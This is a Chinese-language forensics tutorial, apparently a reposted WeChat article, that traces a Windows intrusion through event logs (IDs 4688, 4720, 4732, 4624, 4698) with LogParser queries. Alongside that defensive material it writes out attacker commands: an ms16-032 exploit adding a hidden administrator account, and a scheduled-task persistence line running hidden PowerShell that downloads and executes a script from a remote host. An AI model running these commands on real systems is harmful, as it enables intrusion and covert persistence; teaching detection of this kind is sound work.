> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/pzQxkl3Ngbapuso75LgnLQ)

有小伙伴问：Windows 系统日志分析大多都只是对恶意登录事件进行分析的案例，可以通过系统日志找到其他入侵痕迹吗？

答案肯定是可以的，当攻击者获取 webshell 后，会通过各种方式来执行系统命令。所有的 web 攻击行为会存留在 web 访问日志里，而执行操作系统命令的行为也会存在在系统日志。

不同的攻击场景会留下不一样的系统日志痕迹，不同的 Event ID 代表了不同的意义，需要重点关注一些事件 ID，来分析攻击者在系统中留下的攻击痕迹。

我们通过一个攻击案例来进行 windows 日志分析，从日志里识别出攻击场景，发现恶意程序执行痕迹，甚至还原攻击者的行为轨迹。

**1、信息收集**

攻击者在获取 webshell 权限后，会尝试查询当前用户权限，收集系统版本和补丁信息，用来辅助权限提升。

```
whoami
systeminfo

```

**Windows 日志分析：**

在本地安全策略中，需开启审核进程跟踪，可以跟踪进程创建 / 终止。关键进程跟踪事件和说明，如：

```
4688 创建新进程
4689 进程终止

```

我们通过 LogParser 做一个简单的筛选，得到 Event ID 4688，也就是创建新进程的列表，可以发现用户 Bypass，先后调用 cmd 执行 whami 和 systeminfo。Conhost.exe 进程主要是为命令行程序（cmd.exe）提供图形子系统等功能支持。

```
LogParser.exe  -i:EVT "SELECT TimeGenerated,EventID,EXTRACT_TOKEN(Strings,1,'|')  as UserName,EXTRACT_TOKEN(Strings,5,'|')  as ProcessName FROM c:\11.evtx where EventID=4688"

```

**2、权限提升**

通过执行 exp 来提升权限，获取操作系统 system 权限，增加管理用户。

```
ms16-032.exe "whoami"
ms16-032.exe "net user test1 abc123! /add"
ms16-032.exe "net localgroup Administrators test1 /add"

```

**Windows 日志分析：**

在本地安全策略中，需开启审核账户管理，关键账户管理事件和说明。如：

```
4720  创建用户
4732  已将成员添加到启用安全性的本地组

```

这里会涉及进程创建，主要关注账户创建和管理用户组变更。从 Event ID 4720 ，系统新建了一个 test 用户，从 Event ID 4732 的两条记录变化，得到一个关键信息，本地用户 test 从 user 组提升到 Administrators。

**3、管理账号登录**

在创建管理账户后，尝试远程登录到目标主机，获取敏感信息。

```
mstsc /v 10.1.1.188

```

**Windows 日志分析：**

在本地安全策略中，需开启审核登录事件，关键登录事件和说明，如：

```
4624 登录成功
4625 登录失败

```

```
LogParser.exe -i:EVT "SELECT TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,8,'|') as EventType,EXTRACT_TOKEN(Strings,5,'|') as username,EXTRACT_TOKEN(Strings,18,'|') as Loginip FROM C:\3333.evtx where EventID=4624"

```

使用 LogParser 做一下分析，得到系统登录时间，登录类型 10 也就是远程登录，登录用户 test，登录 IP：10.1.1.1。

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nzyonia1tGS5mE465efMtJHO5dMvqmq1HUBMwrYDwcOxSFKJxtlMf5G9Gic0v64s4DGeZ0xtUVNvRw/640?wx_fmt=png)

**4、权限维持**

通过创建计划任务执行脚本后门，以便下次直接进入，使用以下命令可以一键实现：

```
schtasks /create /sc minute /mo 1 /tn "Security Script" /tr "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\"\"\"http://10.1.1.1:8888/logo.txt\"\"\"))\""

```

**Windows 日志分析：**

在本地安全策略中，需开启审核对象访问，关键对象访问事件，如：

```
4698  创建计划任务
4699  删除计划任务

```

这里涉及进程创建和对象访问事件，包括 schtasks.exe 进程的创建和 Event ID 4698 发现新建的计划任务。成功找到计划任务后门位置：

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nzyonia1tGS5mE465efMtJHzvCPGbUOGdEKFicqDXyYkEJ7yY7fG0Ror9Os2qiaG8CUKDRbxibvcqjwA/640?wx_fmt=png)